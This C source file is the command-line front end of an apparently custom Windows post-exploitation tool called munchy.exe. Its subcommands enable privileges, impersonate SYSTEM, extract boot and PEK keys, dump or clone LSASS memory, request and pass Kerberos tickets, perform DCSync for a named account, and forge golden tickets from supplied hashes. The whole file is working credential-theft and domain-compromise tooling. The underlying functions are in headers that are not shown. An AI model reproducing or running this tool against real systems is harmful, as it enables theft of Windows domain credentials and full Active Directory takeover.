#pragma once
// #include <stdlib.h>

// #include "./include/token.c"

// #include "./include/lsass.c"
#include "dc_sync/dcsync.h"
#include "lsa/lsa.h"
#include "lsass/lsass.h"
#include "token/token.h"

#include "kerberos/kerb.h"

#include <argtable3.h>
#include <wincrypt.h>
#include <windows.h>
const char *banner = "_____________,-.___     _\n"
                     "|____        { {]_]_]   [_]\n"
                     "|___ `-----.__\\ \\_]_]_    . `\n"
                     "|   `-----.____} }]_]_]_   ,\n"
                     "|_____________/ {_]_]_]_] , `\n"
                     "            `-'";

struct command {
  const char *name;
  int (*handler)(int, char **);
};

int cmd_token(int argc, char *argv[]) {
  struct arg_end *end;
  struct arg_lit *help;
  struct arg_str *priv;
  void *argtable[] = {
      help = arg_lit0(NULL, "help", "show help"),
      priv = arg_str1(NULL, "priv", "<value>",
                      "required privilege name without 'Se'"),
      end = arg_end(20),
  };
  int narg = sizeof(argtable) / sizeof(argtable[0]);
  int nerrors = arg_parse(argc, argv, argtable);
  if (arg_nullcheck(argtable) != 0) {
    printf("out of memory\n");
    return 1;
  }

  if (help->count > 0) {
    printf("Usage: token");
    arg_print_syntax(stdout, argtable, "\n");
    arg_print_glossary(stdout, argtable, "  %-25s %s\n");
    arg_freetable(argtable, narg);
    return 0;
  }

  if (nerrors > 0) {
    arg_print_errors(stdout, end, "token");
    printf("Try: token --help\n");
    arg_freetable(argtable, narg);
    return 1;
  }
  printf("priv value received: %s\n", priv->sval[0]);
  NTSTATUS status = EnablePrivilege(priv->sval[0]);
  printf("status: 0x%08lX\n", (unsigned long)status);
  return 0;
}
int cmd_lsass(int argc, char *argv[]) {

  struct arg_end *end;
  struct arg_lit *help;
  struct arg_lit *clone = arg_lit0("c", "clone", "clone lsass and dump");
  void *argtable[] = {
      help = arg_lit0(NULL, "help", "show help"),
      clone,
      end = arg_end(20),
  };
  int narg = sizeof(argtable) / sizeof(argtable[0]);
  int nerrors = arg_parse(argc, argv, argtable);
  if (arg_nullcheck(argtable) != 0) {
    printf("out of memory\n");
    return 1;
  }
  if (help->count > 0) {
    printf("Usage: lsass");
    arg_print_syntax(stdout, argtable, "\n");
    arg_print_glossary(stdout, argtable, "  %-25s %s\n");
    arg_freetable(argtable, narg);
    return 0;
  }
  if (nerrors > 0) {
    arg_print_errors(stdout, end, "token");
    printf("Try: lsass --help\n");
    arg_freetable(argtable, narg);
    return 1;
  }

  HANDLE lsassPID = Find();
  // printf("Handle value: %p\n", lsassPID);
  EnablePrivilege("debug");
  ImpersonateSystem();
  //  NTSTATUS status = ImpersonateSystem();
  //  if (status != 0) {
  //    printf("status failed for impersonation: 0x%08lX\n", status);
  //    return 1;
  //  }

  UINT8 *bootKey = ExtractSysKey();

  ExtractPEKKey(bootKey);

  if (lsassPID != NULL) {
    if (clone->count > 0) {
      NTSTATUS status = Clone(lsassPID);
    } else {
      printf("defaulting to traditional methods...\n");
      NTSTATUS status = DumpLsa(lsassPID);
      printf("0x%08lX\n", status);
    }
  }

  return 0;
}

int cmd_lsa(int argc, char *argv[]) {
  struct arg_end *end;
  struct arg_lit *help;
  struct arg_str *spn;
  struct arg_str *user;
  struct arg_str *passwd;
  struct arg_str *domain;
  struct arg_str *outfile;
  struct arg_str *infile;
  void *argtable[] = {
      help = arg_lit0(NULL, "help", "show help"),
      spn = arg_str0(NULL, "spn", "<value>", "spn/target service"),
      passwd = arg_str0(NULL, "passwd", "<value>", "optional password"),
      user = arg_str0(NULL, "user", "<value>", "optional username"),
      domain = arg_str0(NULL, "domain", "<value>", "optional domain"),
      outfile = arg_str0(NULL, "outfile", "<value>", "output file for ticket"),
      infile =
          arg_str0(NULL, "input", "<value>", "input file for pass the ticket."),
      end = arg_end(20),
  };
  int narg = sizeof(argtable) / sizeof(argtable[0]);

  if (arg_nullcheck(argtable) != 0) {
    printf("out of memory\n");
    return 1;
  }

  int nerrors = arg_parse(argc, argv, argtable);

  if (help->count > 0) {
  help_goto:
    printf("Usage: lsa");
    arg_print_syntax(stdout, argtable, "\n");
    arg_print_glossary(stdout, argtable, "  %-25s %s\n");
    arg_freetable(argtable, narg);
    return 0;
  }
  if (nerrors > 0) {
    arg_print_errors(stdout, end, "lsa");
    printf("Try: lsa --help\n");
    arg_freetable(argtable, narg);
    return 1;
  }
  PCredHandle credH = NULL;
  if (user->count > 0 && passwd->count > 0 && domain->count > 0 &&
      spn->count > 0 && outfile->count > 0) {
    EnablePrivilege("debug");
    ImpersonateSystem();
    // PBYTE ticketOut;
    // ULONG ticketLen = 0;
    NTSTATUS status = PreAuth(user->sval[0], passwd->sval[0], domain->sval[0],
                              spn->sval[0], outfile->sval[0]);

    // printf("ticket length: %llu\n", sizeof(ticketOut));
    return 0;
  }
  if (infile->count > 0) {
    EnablePrivilege("debug");
    // ImpersonateSystem();
    HANDLE hFile = CreateFile(infile->sval[0], GENERIC_READ,
                              FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
                              OPEN_EXISTING, 0, NULL);
    PBYTE data;
    DWORD dwBytesReaded;
    LARGE_INTEGER filesize;
    DWORD length;
    if (hFile == ERROR_FILE_HANDLE_REVOKED || hFile == NULL) {
      printf("Cannot open kirbi file: 0x%lx\n", GetLastError());
      return -1;
    }
    printf("reading file..\n");
    GetFileSizeEx(hFile, &filesize);
    length = filesize.LowPart;
    data = (PBYTE)LocalAlloc(LPTR, length);
    ReadFile(hFile, data, length, &dwBytesReaded, NULL);
    CloseHandle(hFile);
    printf("read file..\n");
    NTSTATUS status = Ptt(data, length);
    printf("pass the ticket status: 0x%lx\n", status);
    return 0;
  }

  if (spn->count == 0 && infile->count == 0) {
    goto help_goto;
  }

  // Convert spn to wide string
  int spn_len = MultiByteToWideChar(CP_UTF8, 0, spn->sval[0], -1, NULL, 0);
  PWCHAR spn_w = (PWCHAR)LocalAlloc(LPTR, spn_len * sizeof(wchar_t));
  MultiByteToWideChar(CP_UTF8, 0, spn->sval[0], -1, spn_w, spn_len);

  NTSTATUS status =
      Kerberos_ask(spn_w, outfile->sval[0], L"default", L"default", credH);
  if (status != 0) {
    printf("status: 0x%lX\n", status);
  }

  arg_freetable(argtable, narg);
  return status != 0 ? -1 : 0;
}

void CharToWide(const char *str, WCHAR *buffer, int bufferSize) {
  if (!str || !buffer || bufferSize <= 0)
    return;

  int charsWritten = MultiByteToWideChar(
      CP_UTF8,   // source string is UTF-8 (or use CP_ACP for ANSI)
      0,         // no special flags
      str,       // source string
      -1,        // null-terminated source
      buffer,    // destination wide string buffer
      bufferSize // size of destination buffer in WCHARs
  );

  if (charsWritten == 0) {
    wprintf(L"Conversion failed: 0x%lx\n", GetLastError());
    buffer[0] = L'\0';
  }
}

int cmd_dcsync(int argc, char *argv[]) {
  struct arg_end *end;
  struct arg_lit *help;
  struct arg_str *samaccountname;
  void *argtable[] = {
      help = arg_lit0(NULL, "help", "show help"),
      samaccountname =
          arg_str1(NULL, "user", "<value>", "object sam Account name"),
      end = arg_end(20),
  };
  if (arg_nullcheck(argtable) != 0) {
    printf("out of memory\n");
    return 1;
  }
  int nerrors = arg_parse(argc, argv, argtable);
  int narg = sizeof(argtable) / sizeof(argtable[0]);
  if (nerrors > 0) {
    arg_print_errors(stdout, end, "dcsync");
    printf("Try: dcsync --help\n");
    arg_freetable(argtable, narg);
    return 1;
  }
  if (help->count > 0) {
    printf("Usage: dcsync");
    arg_print_syntax(stdout, argtable, "\n");
    arg_print_glossary(stdout, argtable, "  %-25s %s\n");
    arg_freetable(argtable, narg);
    return 0;
  }
  const char *samaccountnameRaw = samaccountname->sval[0];
  WCHAR wideSamAccountName[256];
  CharToWide(samaccountnameRaw, wideSamAccountName,
             _countof(wideSamAccountName));
  // EnablePrivilege("debug");
  // ImpersonateSystem();
  //  printf("running dcsync..\n");
  DCSync(wideSamAccountName);

  return 0;
}

int cmd_kerberos(int argc, char *argv[]) {
  struct arg_end *end;
  struct arg_lit *help;
  struct arg_lit *gold;
  struct arg_str *user;
  struct arg_str *domain;
  struct arg_str *domainSID;
  struct arg_str *rc4;
  struct arg_str *aes128;
  struct arg_str *aes256;
  struct arg_str *spn;

  void *argtable[] = {
      help = arg_lit0(NULL, "help", "show help"),
      gold = arg_lit0(NULL, "gold?", "golden ticket?"),
      user = arg_str1(NULL, "user", "<value>", "user to target"),
      domain = arg_str1(NULL, "domain", "<value>", "domain"),
      domainSID = arg_str0(NULL, "dsid", "<value>", "domain SID"),
      rc4 = arg_str0(NULL, "rc4", "<value>", "nt hash"),
      aes128 = arg_str0(NULL, "aes128", "<value>", "aes128 key"),
      aes256 = arg_str0(NULL, "aes256", "<value>", "aes256 key"),
      spn = arg_str0(NULL, "spn", "<value>", "spn to target"),
      end = arg_end(20),
  };
  if (arg_nullcheck(argtable) != 0) {
    printf("out of memory\n");
    return 1;
  }
  int nerrors = arg_parse(argc, argv, argtable);
  int narg = sizeof(argtable) / sizeof(argtable[0]);
  if (nerrors > 0) {
    arg_print_errors(stdout, end, "kerb");
    printf("Try: kerb --help\n");
    arg_freetable(argtable, narg);
    return 1;
  }
  if (help->count > 0) {
    printf("Usage: kerb");
    arg_print_syntax(stdout, argtable, "\n");
    arg_print_glossary(stdout, argtable, "  %-25s %s\n");
    arg_freetable(argtable, narg);
    return 0;
  }
  if (gold->count > 0) {
    const char *domain_str = domain->sval[0];
    const char *user_str = user->sval[0];
    const char *rc4_str = rc4->sval[0];
    const char *aes128_str = aes128->sval[0];
    const char *aes256_str = aes256->sval[0];
    const char *domainSID_str = domainSID->sval[0];
    const char *spn_str = spn->sval[0];
    Golden(domain_str, user_str, rc4_str, aes128_str, aes256_str, domainSID_str,
           spn_str);
  }

  return 0;
}

struct command cmds[] = {
    {"token", cmd_token},   {"lsass", cmd_lsass},   {"lsa", cmd_lsa},
    {"dcsync", cmd_dcsync}, {"kerb", cmd_kerberos},

};

int main(int argc, char *argv[]) {
  printf("%s\n", banner);
  if (argc < 2) {
    printf("usage: munchy.exe <command>\n");
    for (int i = 0; i < sizeof(cmds) / sizeof(cmds[0]); i++) {
      printf("munchy.exe %s --help\n", cmds[i].name);
    }
    return 1;
  }
  const char *cmd = argv[1];
  for (int i = 0; i < sizeof(cmds) / sizeof(cmds[0]); i++) {
    if (strcmp(cmds[i].name, cmd) == 0) {
      return cmds[i].handler(argc - 1, argv + 1);
    }
  }
  printf("Unknown command: %s\n", cmd);
  return EXIT_FAILURE;
}
